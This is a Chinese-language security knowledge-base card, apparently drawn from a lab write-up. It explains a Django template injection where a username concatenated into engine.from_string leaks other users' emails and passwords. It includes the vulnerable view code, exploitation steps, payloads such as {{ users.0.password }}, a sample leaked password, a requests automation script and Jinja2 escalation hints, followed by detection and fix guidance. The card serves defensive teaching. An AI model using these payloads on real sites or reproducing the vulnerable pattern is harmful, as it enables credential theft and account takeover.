---
id: web-python-ssti-django-username-template-source-credential-leak
title: Django 模板字符串拼接用户名导致 SSTI 泄露账号密码
type: scenario
domain: web
path: web/python/ssti
technique: django-template-source-injection
tags:
- python
- django
- ssti
- template-injection
- credential-leak
- orm
- username
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V8
  verified_at: '2026-11-05T00:26:50+08:00'
  notes: 已对照原文与图 13-14、35 张图核对：likes 视图把 user.username 拼进 engine.from_string 模板源，{{ request }} 探测、{{ users.0.email }}/{{ users.0.password }} 泄露 hexhunter@ciphermail.com / H3xHunt3r! 并成功 SSH 登录，均与原文一致；PoC 未在本机对真实目标执行。
url: /docs/web/python/ssti/web-python-ssti-django-username-template-source-credential-leak/
draft: false
kb_aliases:
- Django SSTI
- engine.from_string 注入
- 用户名模板注入
- '{{ users.0.password }}'
- Django 模板源拼接
---

## 一句话结论

Django 视图把用户可控的 `username` 直接拼进 `engine.from_string()` 的模板源，而不是作为上下文变量传入；攻击者把用户名改成 `{{ users.0.password }}`，在点赞列表页渲染时即可读取 ORM 查询集字段，泄露其他用户的邮箱与明文/哈希密码。

## 原理

- 漏洞代码在点赞列表视图：遍历 `post.likes.all()`，用字符串拼接生成 HTML：
  ```python
  template_string += '<div class="likes-review-item"><a href="/profile/'+str(user.pk)+'"><img src="'+user.picture.url+'" title="'+user.username+'"></a></div>'
  template = engine.from_string(template_string)
  return HttpResponse(template.render(context, request))
  ```
- `user.username` 来自用户资料，攻击者可任意修改。它被拼进**模板源**而非作为变量值传入，因此其中的 `{{ ... }}` 会被 Django 模板引擎当作表达式执行；Django 的自动转义只作用于变量输出，不作用于模板源本身。
- 视图传给模板的上下文是 `{"users": users}`，`users = post.likes.all()` 是 `SocialUser` 查询集；模板中可用 `users.0` 取第一个元素，再访问其任意字段。
- `{{ users.0.email }}` 泄露邮箱，`{{ users.0.password }}` 泄露密码字段；若应用把密码明文存库（原文 SocialUser 即如此），可直接得到明文口令。
- 攻击者控制点赞顺序/目标帖，使目标用户成为查询集第 0 个元素，即可定向泄露；即使不是第 0 个，也可遍历 `users.N`。
- `{{ request }}` 可用于探测模板上下文存在与调试；原文先用它确认注入，再换字段读取。

## 触发条件

- Django 应用存在“把用户输入拼进模板字符串后 `engine.from_string()`/`Template()` 编译”的代码。
- 用户名字段可被攻击者修改，且会出现在被拼接的模板源中（点赞列表、评论、个人资料等页面）。
- 模板上下文包含敏感对象（如用户查询集、request、settings）。
- 攻击者已注册/登录账号，并能对目标帖子点赞或触发列表渲染。

## 利用步骤

1. 注册并登录账号，打开个人资料编辑，把用户名改为探测 payload `{{ request }}` 或 `{{ 7*7 }}`。
2. 对目标帖子点赞，访问 `/likes/<post_id>`（或触发该模板渲染的接口），确认 payload 被渲染（如出现 49 或 request 对象内容）。
3. 把用户名改为 `{{ users.0.email }}` 与 `{{ users.0.password }}`，再次访问点赞列表。
4. 从返回 HTML 的 `title="..."` 或页面文本中提取邮箱与密码。
5. 用泄露凭据登录 SSH/后台；若目标用户不在索引 0，调整点赞顺序或改用 `users.N` 遍历。

## PoC

修改用户名（示例）：

```text
{{ users.0.password }}
```

访问点赞列表后，返回中出现：

```html
<div class="likes-review-item">
  <a href="/profile/27">
    <img src="/media/test.jpg" title="H3xHunt3r!">
  </a>
</div>
```

组合读取邮箱与密码：

```text
{{ users.0.email }} {{ users.0.password }}
```

自动化脚本片段（登录后改用户名并请求点赞列表）：

```python
import requests
s = requests.Session()
s.post("http://target/login", data={"email": "attacker@x.com", "password": "..."})
s.post("http://target/profile/edit", data={"username": "{{ users.0.password }}"})
r = s.get("http://target/likes/10")
print(r.text)   # 从 title="..." 中提取泄露值
```

## 变体与关联

- 变体：同一拼接模式出现在评论、消息、搜索高亮等页面；凡是把用户名/昵称拼进模板源的地方都可复用。
- 变体：上下文若包含 `request`，可进一步读取 session、headers、settings；若包含 ORM 对象，可读取任意字段/关联对象。
- 变体：若模板引擎是 Jinja2（Flask），`{{ config }}`、`{{ ''.__class__.__mro__ }}` 等可升级到 RCE；Django 模板默认无任意方法调用，但足以泄露上下文数据。
- 关联：Django 模板注入与 Jinja2 SSTI 的上下文探测方法一致，但 Django 模板语法限制更多（不能直接调用任意方法）。
- 关联卡片：[[web-python-deserialization-django-file-cache-pickle-rce]]

## 检测与防御

- 检测：用户名/昵称等字段出现 `{{`、`{%`、`}}` 等模板语法；同一账号短时间内修改用户名并访问点赞/评论列表。
- 检测：`engine.from_string`/`Template(` 的输入包含请求参数；代码审计重点关注字符串拼接模板。
- 检测：响应中出现模板表达式被渲染的痕迹（如 `49`、ORM 字段值、`request` 对象）。
- 修复：禁止把用户输入拼进模板源；使用固定模板文件，把用户名作为上下文变量并依赖自动转义。
- 加固：用户名等资料字段做字符白名单/长度限制；模板上下文最小化，不把整个用户对象/查询集/request 传入；对敏感字段做脱敏。
- 注意：Django 自动转义不能防御模板源注入；`|safe`/`mark_safe` 也不是根因，根因是“用户输入成为模板代码”。
